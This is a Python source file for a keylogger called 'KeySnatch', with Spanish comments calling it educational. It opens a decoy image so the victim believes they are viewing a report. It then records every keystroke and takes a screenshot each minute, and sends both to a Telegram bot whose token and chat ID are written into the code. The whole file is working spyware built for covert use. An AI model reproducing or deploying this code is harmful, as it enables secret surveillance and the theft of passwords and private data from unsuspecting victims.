
# KeySnatch - Keylogger educativo con envío de teclas y capturas a Telegram

# Importamos librerías necesarias
import subprocess              # Para ejecutar comandos del sistema (si es necesario
import pynput.keyboard         # type: ignore # Para escuchar las teclas presionadas
import threading               # Para ejecutar funciones al mismo tiempo (paralelamente)
import requests                # type: ignore # Para enviar datos al bot de Telegram
import pyautogui               # type: ignore # Para tomar capturas de pantalla
import time                    # Para manejar pausas entre envíos
import os                      # Para manejar archivos temporales
import sys                     # Para manejar argumentos del sistema
from detime import detime      # type: ignore # Asumimos que esta es una función personalizada tuya (quizás marca de tiempo)

# ------------------ Configuración de entornoModificar tu script para abrir el Word falso ------------------

def abrir_imagen_falsa():
    try:
        if hasattr(sys, '_MEIPASS'):
            # Si se está ejecutando como un ejecutable empaquetado (ej. PyInstaller)
            ruta_base = sys._MEIPASS
        else:
            ruta_base = os.path.abspath(".")  # Ruta del directorio actual

        # Ruta de la imagen falsa que se abrirá
        ruta_imagen = os.path.join(ruta_base, "informe.jpg")
        os.startfile(ruta_imagen)
    except Exception as e:
        print(f"[!] No se pudo abrir la imagen falsa: {e}")

abrir_imagen_falsa()


# ------------------ Configuración de Telegram ------------------

# Token de tu bot de Telegram (copia el tuyo desde @BotFather)
TOKEN = '7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is'

# Chat ID al que quieres enviar las teclas y capturas
CHAT_ID = '5719356323'

# Variable para almacenar las teclas capturadas
log = ""

# ------------------ Función para enviar texto (teclas) a Telegram ------------------

def enviar_telegram(mensaje):
    """
    Esta función envía un mensaje de texto al chat de Telegram usando el bot.
    """
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': mensaje}
    
    try:
        r = requests.post(url, data=data)
        if r.status_code != 200:
            print(f"[!] Error al enviar a Telegram: {r.text}")
        else:
            print(f"[+] Log enviado a Telegram")
    except Exception as e:
        print(f"[!] Excepción al enviar a Telegram: {e}")

# ------------------ Función para capturar y enviar pantalla cada cierto tiempo ------------------

def enviar_capturas():
    """
    Esta función toma una captura de pantalla cada 60 segundos,
    la envía a Telegram como imagen, y luego la borra.
    """
    while True:
        try:
            nombre_archivo = "temp_screenshot.png"  # Nombre temporal
            captura = pyautogui.screenshot()        # Captura la pantalla actual
            captura.save(nombre_archivo)            # Guarda la imagen

            with open(nombre_archivo, 'rb') as foto:
                # Envía la imagen al bot de Telegram como 'photo'
                requests.post(
                    f'https://api.telegram.org/bot{TOKEN}/sendPhoto',
                    data={'chat_id': CHAT_ID},
                    files={'photo': foto}
                )
            print("[+] Captura enviada")  # Confirmación en consola

            os.remove(nombre_archivo)  # Elimina la imagen después de enviarla

        except Exception as e:
            print(f"[!] Error al enviar captura: {e}")

        time.sleep(60)  # Espera 60 segundos antes de tomar otra

# ------------------ Función que guarda cada tecla presionada ------------------

def guardar_log(key):
    """
    Esta función se ejecuta cada vez que se presiona una tecla.
    Guarda la tecla en una variable global 'log'.
    """
    global log
    try:
        if key.char:
            log += key.char  # Agrega caracteres normales (letras, números)
        else:
            log += f' [{key}] '  # Agrega otras teclas como [enter], [ctrl], etc.
    except AttributeError:
        log += f' [{key}] '      # Si la tecla no tiene .char, como Shift o Esc

    # Si se presiona ESC, se detiene el programa
    if key == pynput.keyboard.Key.esc:
        return False

    # Muestra por consola las últimas teclas presionadas (para depuración)
    print(f"[+] Tecla capturada: {log[-10:]}")

# ------------------ Función para enviar el log cada 60 segundos ------------------

def reporte():
    """
    Esta función envía el contenido del log de teclas al bot cada 60 segundos.
    """
    global log
    if log:
        enviar_telegram(log)  # Envía lo que se ha escrito
        log = ""              # Borra el contenido después de enviar

    # Llama esta misma función cada 60 segundos (de forma recursiva con threading)
    timer = threading.Timer(60, reporte)
    timer.start()

# ------------------ Listener del teclado y ejecución de todo el sistema ------------------

# Este objeto se encargará de escuchar las teclas que se presionan
keyboard_listener = pynput.keyboard.Listener(on_press=guardar_log)

# Ejecutamos todo dentro de este bloque
with keyboard_listener:
    # Inicia el hilo de capturas automáticas
    threading.Thread(target=enviar_capturas, daemon=True).start()

    # Inicia el ciclo de envío del log
    reporte()

    # Este método hace que el programa siga corriendo hasta que se presione ESC
    keyboard_listener.join()